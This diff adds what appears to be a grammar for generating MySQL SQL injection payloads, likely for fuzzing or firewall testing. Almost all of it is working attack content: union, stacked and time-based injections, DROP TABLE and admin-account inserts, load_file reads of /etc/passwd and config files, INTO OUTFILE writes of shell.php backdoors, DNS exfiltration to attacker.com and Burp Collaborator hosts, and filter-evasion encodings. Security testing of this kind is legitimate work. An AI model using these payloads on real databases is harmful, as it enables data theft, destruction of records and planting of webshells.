@@ -1,0 +1,151 @@
+start : numericContext | sQuoteContext | dQuoteContext;
+
+//### Injection Context ###
+numericContext : terDigitIncludingZero wsp booleanAttack wsp | terDigitIncludingZero terSQuote wsp booleanAttack wsp opOr terSQuote terDigitZero | terDigitIncludingZero wsp sqliAttack cmt;
+sQuoteContext : terDigitZero terSQuote fuzzStr wsp booleanAttack wsp opOr terSQuote | terDigitZero terSQuote opOr wsp fuzzEqual wsp booleanAttack wsp opOr terSQuote | terDigitZero terSQuote fuzzStr wsp sqliAttack cmt;
+dQuoteContext : terDigitZero terDQuote fuzzStr wsp booleanAttack wsp opOr terDQuote | terDigitZero terDQuote opOr wsp fuzzEqual wsp booleanAttack wsp opOr terDQuote | terDigitZero terDQuote fuzzStr wsp sqliAttack cmt;
+sqliAttack : unionAttack | piggyAttack | errorAttack | booleanAttack | timeAttack | stackedAttack | outOfBandAttack | jsonAttack | infoFuncAttack;
+
+//### Union Attacks ###
+unionAttack : opUnion wsp opSel wsp cols | opUnion wsp opAll wsp opSel wsp cols | opUnion wsp parOpen opSel wsp cols par;
+cols : terDigitZero | terDigitZero opCom cols | opNull | opNull opCom cols;
+
+//### Piggy-backed Attacks ###
+piggyAttack : opSem opSel wsp funcSleep | opSem opDrop wsp opTable wsp tableName | opSem opInsert wsp opInto wsp tableName wsp opValues wsp parOpen terSQuote adminUser terSQuote opCom terSQuote adminPass terSQuote par;
+
+//### Time-based Blind Attacks (MySQL-specific) ###
+timeAttack : opAnd wsp funcSleep | opAnd wsp funcBenchmark;
+funcSleep : sleep parOpen terDigitExcludingZero par;
+funcBenchmark : 'benchmark' parOpen benchCount opCom hashFunc parOpen terSQuote randStr terSQuote par par | 'benchmark' parOpen benchCount opCom 'md5' parOpen randStr par par;
+hashFunc : 'md5' | 'sha1' | 'sha2' | 'sha256' | 'sha512';
+benchCount : '1000000' | '5000000' | '10000000' | '50000000';
+randStr : 'test' | 'random' | 'payload' | 'benchmark' | 'sqli';
+
+//### Stacked Queries ###
+stackedAttack : opSem opInsert wsp opInto wsp tableName wsp opValues wsp parOpen terSQuote adminUser terSQuote opCom terSQuote adminPass terSQuote par | opSem opUpdate wsp tableName wsp opSet wsp colName opEqual terSQuote newValue terSQuote;
+
+//### Out-of-Band Attacks (MySQL-specific) ###
+outOfBandAttack : opAnd wsp funcLoadFile | opAnd wsp funcIntoOutfile | opAnd wsp funcIntoDumpfile | opAnd wsp dnsExfil;
+funcLoadFile : 'load_file' parOpen terSQuote filePath terSQuote par;
+funcIntoOutfile : opSel wsp colName wsp opInto wsp 'outfile' wsp terSQuote outPath terSQuote;
+funcIntoDumpfile : opSel wsp colName wsp opInto wsp 'dumpfile' wsp terSQuote outPath terSQuote;
+dnsExfil : 'extractvalue' parOpen terDigitOne opCom 'concat' parOpen terSQuote dnsPrefix terSQuote opCom parOpen opSel wsp 'database' parOpen par par opCom terSQuote dnsSuffix terSQuote par par;
+dnsPrefix : '//';
+dnsSuffix : '.attacker.com' | '.burpcollaborator.net' | '.oastify.com';
+filePath : '/etc/passwd' | '/etc/my.cnf' | '/var/www/html/config.php' | '/etc/mysql/my.cnf' | '/usr/local/mysql/data/mysql/user.MYD';
+outPath : '/tmp/shell.php' | '/var/www/html/shell.php' | '/tmp/backdoor.php' | '/var/tmp/shell.php';
+
+//### Error-based Attacks ###
+errorAttack : opAnd wsp errorFunction parOpen terDigitOne opCom nconcat parOpen n0x7e opCom nversion opCom n0x7e par opCom terDigitOne par | opAnd wsp errorFuncExp | opAnd wsp errorFuncFloor;
+errorFunction : 'updatexml' | 'extractvalue';
+errorFuncExp : 'exp' parOpen opTilde parOpen opSel wsp mulFrom par par;
+errorFuncFloor : parOpen opSel wsp terDigitOne wsp opFrom wsp parOpen opSel wsp 'count' parOpen opStar par opCom 'floor' parOpen 'rand' parOpen par opStar terDigitTwo par wsp 'x' wsp opFrom wsp 'information_schema.tables' wsp opGroup wsp opBy wsp 'x' par wsp terChar par;
+nconcat : 'concat';
+n0x7e : '0x7e';
+nversion : '@@version' | 'database' parOpen par | 'user' parOpen par | '@@datadir' | '@@hostname' | '@@basedir' | 'version' parOpen par;
+
+//### Boolean values ###
+booleanAttack : orAttack | andAttack;
+orAttack : opOr wsp booleanTrueExpr;
+andAttack : opAnd wsp booleanFalseExpr;
+
+//### True ###
+booleanTrueExpr : unaryTrue | binaryTrue;
+unaryTrue : trueAtom | opNot wsp falseAtom | opBinInvert wsp falseAtom;
+binaryTrue : unaryTrue opEqual wsp unaryTrue | unaryFalse opEqual wsp unaryFalse | terSQuote terChar terSQuote opEqual terSQuote terChar terSQuote | unaryFalse opLt wsp unaryTrue | unaryTrue opGt wsp unaryTrue | trueAtom wsp opLike wsp trueAtom | unaryTrue wsp opIs wsp trueConst | unaryFalse wsp opIs wsp falseConst | unaryTrue opMinus wsp unaryFalse | trueAtom wsp opIn wsp parOpen trueAtom par | trueAtom wsp opBetween wsp trueAtom wsp opAnd wsp trueAtom;
+trueAtom : trueConst | terDigitOne | na wsp n11 | nx wsp parOpen opSel wsp n111 | nif wsp n11;
+trueConst : 'true';
+na : '{a';
+n11 : '1}=1';
+nx : '{x';
+n111 : '1)}=1';
+nif : '{`if`';
+
+//### False ###
+booleanFalseExpr : unaryFalse;
+unaryFalse : opNot wsp trueAtom | opNot wsp opBinInvert wsp falseAtom | falseAtom;
+falseAtom : falseConst | terDigitZero;
+falseConst : 'false';
+
+//### MySQL Schema & Table References ###
+mulFrom : opStar wsp opFrom wsp mysqlSchema | opStar wsp opFrom wsp tableName;
+mysqlSchema : 'information_schema.tables' | 'information_schema.columns' | 'information_schema.schemata' | 'information_schema.user_privileges' | 'mysql.user' | 'mysql.db' | 'information_schema.table_constraints' | 'information_schema.key_column_usage';
+tableName : 'users' | 'admin' | 'accounts' | 'customers' | 'members' | 'login' | 'credentials' | 'user' | 'auth';
+colName : 'username' | 'password' | 'email' | 'role' | 'id' | 'token' | 'session_id' | 'user' | 'pass' | 'pwd' | 'host' | 'authentication_string';
+adminUser : 'admin' | 'root' | 'administrator' | 'dbadmin' | 'mysql';
+adminPass : 'admin123' | 'password' | 'P@ssw0rd' | 'root' | 'toor' | '123456';
+newValue : 'hacked' | 'pwned' | '1' | 'admin';
+
+//### JSON Functions (MySQL 5.7+/8.0+) ###
+jsonAttack : opAnd wsp jsonExtract | opAnd wsp jsonArrayAgg | opAnd wsp jsonKeys | opAnd wsp jsonContains;
+jsonExtract : 'json_extract' parOpen tableName opCom terSQuote '$.password' terSQuote par | 'json_extract' parOpen colName opCom terSQuote '$.email' terSQuote par;
+jsonArrayAgg : 'json_arrayagg' parOpen colName par;
+jsonKeys : 'json_keys' parOpen tableName par | 'json_keys' parOpen colName par;
+jsonContains : 'json_contains' parOpen colName opCom terSQuote jsonValue terSQuote par;
+jsonValue : '{"admin":true}' | '"admin"' | '1';
+
+//### MySQL Information Functions ###
+infoFuncAttack : opAnd wsp mysqlInfoFunc | opAnd wsp mysqlStrFunc;
+mysqlInfoFunc : 'database' parOpen par | 'schema' parOpen par | 'user' parOpen par | 'current_user' parOpen par | 'system_user' parOpen par | 'session_user' parOpen par | 'version' parOpen par | 'connection_id' parOpen par | 'last_insert_id' parOpen par | 'row_count' parOpen par;
+mysqlStrFunc : 'concat' parOpen terSQuote terChar terSQuote opCom terSQuote terChar terSQuote par | 'concat_ws' parOpen terSQuote opCom terSQuote opCom colName opCom colName par | 'group_concat' parOpen colName par | 'substring' parOpen colName opCom terDigitOne opCom terDigitExcludingZero par | 'char' parOpen asciiCodes par | 'hex' parOpen colName par | 'unhex' parOpen terSQuote hexString terSQuote par;
+asciiCodes : '65' | '97' | '49' | '48' | '65,100,109,105,110';
+hexString : '61646d696e' | '70617373776f7264' | '726f6f74';
+
+//### Obfuscation ###
+wsp : blank;
+
+//### Syntax-repairing (MySQL Comments) ###
+cmt : doubleDash blank | hashtag | inlineComment;
+doubleDash : '--' | '%23%23';
+blank : '+' | '%20' | '%0b' | '%09' | '%0a' | '%0d';
+hashtag : '%23' | '#';
+inlineComment : '/**/' | '/*!' | '/*!50000*/' | '/*!12345*/' | '/*' mysqlVersion '*/' | '/**_**/';
+mysqlVersion : '50000' | '50001' | '50718' | '80000' | '80030';
+
+//### SQL functions and constants ###
+sleep : 'sleep';
+fuzzStr : '<@=1' | '<@!=1' | '<@=1.' | '<@=.1' | '<@!=.1' | '<@!=1.';
+fuzzEqual : '1<@' | '@<@' | '!@<@' | '!@<@.' | '1<@.' | '@<@.';
+parOpen : '(' | '%28';
+par : ')' | '%29';
+terDigitIncludingZero : terDigitZero | terDigitExcludingZero;
+terDigitExcludingZero : terDigitOne | terDigitTwo | '3' | '4' | '5' | '6' | '7' | '8' | '9';
+terDigitZero : '0';
+terDigitOne : '1';
+terDigitTwo : '2';
+terSQuote : '\'' | '%27';
+terDQuote : '"' | '%22';
+terChar : 'a' | 'b' | 'x' | 'y';
+
+//### SQL Operators and Keywords ###
+opSem : ';' | '%3B';
+opSel : 'select' | 'SELECT' | 'sElEcT' | 'SeLeCt';
+opAnd : 'and' | 'AND' | '&&' | '%26%26';
+opOr : 'or' | 'OR' | '||' | '%7C%7C';
+opIs : 'is' | 'IS';
+opLike : 'like' | 'LIKE';
+opMinus : '-' | '%2D';
+opCom : ',' | '%2C';
+opGt : '>' | '%3E';
+opLt : '<' | '%3C';
+opEqual : '=' | '%3D';
+opBinInvert : '~' | '%7E';
+opNot : '!' | 'not' | 'NOT' | '%21';
+opUnion : 'union' | 'UNION' | 'uNiOn' | 'UnIoN' | '/*!union*/' | '/**/union/**/' | '/*!50000union*/' | '/**/union%0a/**/' | '%75nion' | 'uni%6fn' | 'un%69on';
+opAll : 'all' | 'ALL';
+opNull : 'null' | 'NULL';
+opDrop : 'drop' | 'DROP';
+opTable : 'table' | 'TABLE';
+opInsert : 'insert' | 'INSERT';
+opInto : 'into' | 'INTO';
+opValues : 'values' | 'VALUES';
+opUpdate : 'update' | 'UPDATE';
+opSet : 'set' | 'SET';
+opFrom : 'from' | 'FROM';
+opWhere : 'where' | 'WHERE';
+opGroup : 'group' | 'GROUP';
+opBy : 'by' | 'BY';
+opIn : 'in' | 'IN';
+opBetween : 'between' | 'BETWEEN';
+opStar : '*';
+opTilde : '~';
